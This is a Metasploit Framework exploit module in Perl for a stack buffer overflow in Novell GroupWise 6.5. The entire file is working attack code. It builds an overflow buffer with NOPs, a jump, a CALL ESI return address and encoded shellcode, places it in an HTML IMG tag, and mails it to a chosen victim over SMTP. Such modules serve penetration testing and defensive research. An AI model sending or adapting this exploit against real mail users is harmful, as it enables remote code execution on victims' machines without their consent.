
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
    # license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::novell_groupwise;
use strict;
use base "Msf::Exploit";
use Pex::Text;
use Mail::Sendmail;

my $advanced = { };

my $info =
  {
	'Name'    => 'Novell Groupwise IMG Tag Overflow',
	'Version' => '$Revision: 1.5 $',
	'Authors' => [ 'Francisco Amato <famato [at] infobyte.com.ar> [ISR] www.infobyte.com.ar'],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'winnt', 'winxp', 'win2k', 'win2003' ],
	'Priv'  => 1,

	'AutoOpts'  =>  { 'EXITFUNC' => 'process' },

	'UserOpts'  =>
	  {
		'EMAILTO' => [1, 'DATA', 'Email to address','victim@victimx.com'],
		'EMAILFROM' => [1, 'DATA', 'Email from address','attaker@attakerx.com'],
		'SUBJECT' => [0, 'DATA', 'Subject', '[ISR] Subject'],
		'BODY' => [0, 'DATA', 'Body','[ISR] Body'],
		'SMTP' => [0, 'DATA', 'Smtp server (relay permited)','127.0.0.1'],		
	  },

	'Payload' =>
	  {
		'Space'     => 800, 		
		'BadChars'  => "\x00\x0a\x2c\x3b\x27", # data is downcased
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a stack overflow in Novell GroupWise
	6.5. This flaw is triggered by img tag src greater than +1000 bytes;

}),

	'Refs'  =>
	  [
		['URL', 'http://www.infobyte.com.ar/adv/ISR-16.html'],
	  ],

        'DefaultTarget'  => 0,
	'Targets' =>
	  [
		[ 'Novell Groupwise 6.5 Universal WIN2000/XP', 0x34AA6DEA], #CALL ESI WTWLE61.DLL (Aug 19  1996)
	  ],

        'Encoder' =>
	          {
                  'Keys' => ['+alphanum'],
	            },					    
		    
	'Keys'  => ['groupwise'],

	'DisclosureDate' => 'Dec 12 2007',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self        = shift;
	my $emailfrom = $self->GetVar('EMAILFROM');
	my $emailto = $self->GetVar('EMAILTO');
	my $subject = $self->GetVar('SUBJECT');	
	my $smtp = $self->GetVar('SMTP');		
	my $body = $self->GetVar('BODY');		
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];

	$self->PrintLine( "[*] Attempting to exploit " . $target->[0] );


    my $buff = $self->MakeNops(204); 
    $buff .= "\xEB\x36"; #jmp shellcode
    $buff .= Pex::Text::AlphaNumText(42); #trash
    $buff .=pack('V', $target->[1]); #call esi
    $buff .=$self->MakeNops(18);
    $buff .=$shellcode;

my $html= qq#
<html>
<head>
</head>
$body
<img src='$buff'>
</html>
#;

my $data = $html;

    my %mail = (To              => $emailto,
                From    => $emailfrom,
                Subject => $subject,
                'content-type'  => 'text/html; charset="iso-8859-1"',
                Message => $data,
                smtp    => $smtp);


    $self->PrintLine("[*] Email sent..");
    sendmail(%mail);
    my $err=$Mail::Sendmail::error;
    if ($err)
    {
        $self->PrintLine("Error: $err");
    }
    return;
}


1; 
